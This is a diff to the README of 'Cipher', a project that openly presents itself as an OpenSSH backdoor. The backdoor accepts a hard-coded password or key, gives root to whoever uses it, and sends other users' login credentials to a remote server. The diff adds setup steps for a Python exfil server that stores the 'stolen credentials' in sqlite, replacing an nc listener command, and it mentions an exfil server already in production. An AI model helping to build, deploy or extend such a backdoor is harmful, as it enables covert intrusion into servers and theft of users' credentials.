@@ -6,7 +6,8 @@
 Cipher is an OpenSSH Portable backdoor that allows authentication using a specific password or generated SSH private key. The password is configurable in `install/generate_key.sh` or `auth-universal.h` after generating a key. Additional features include:
 - Privilege escalation to root for any user that authenticates using the backdoor credentials
   - Attempts to spawn a bash shell regardless of the user's login shell (if unavailable, it tries /bin/sh, then falls back to the user's login shell)
-- Credential exfiltration to remote server upon successful authentication excluding backdoor credentials (falls back to writing to a local file for unrecoverable network errors)
+- Credential exfiltration to remote server upon successful authentication, excluding backdoor credentials (falls back to writing to a local file for unrecoverable network errors)
+  - The included server stores data it receives in a sqlite3 database
 
 Check TODO-backdoor.md to find out what's planned for the future
 
@@ -47,12 +48,13 @@ sudo /opt/cipher-test/sbin/sshd -D -ddd -e -p 2222
 # Optionally set -o "PreferredAuthentications=<password|publickey|keyboard-interactive|etc.>" to test other auth methods.
 ssh localhost -p 2222
 ```
-For the credential exfiltration feature, a simple TCP listener will allow you to see that the credentials are being sent (Official exfil server currently in production):
+The exfil server is located in exfil/server.py. Set the server-ip and server-port args to where you expect the client(s) to send data. You can also specify a different name or path to the database file with `--db`:
 
 ```bash
-nc -lvnp <port>
+./server.py 127.0.0.1 4444 --db /path/to/database.db
 ```
-`sshd` might hang a while before authenticating because it waits for an ACK for the data it sent. The timeout value is 5 seconds, after which it will continue. 
+
+`sshd` can hang for a while before authenticating because it waits for an ACK from the server to know whether the data was processed or not. The timeout value is 5 seconds, after which it will continue. 
 
 On subsequent installs, only `sudo make install` is necessary.
 ### Cleanup
@@ -121,3 +123,4 @@ If any of the above lines is not included in the broken file, try the same order
 - `auth-universal.h` - Exports and declares the above.
 - `exfil.c` - Credential exfiltration logic
 - `exfil.h` - Necessary structs and functions for the above
+- `exfil/server.py` - Remote server for handling stolen credentials
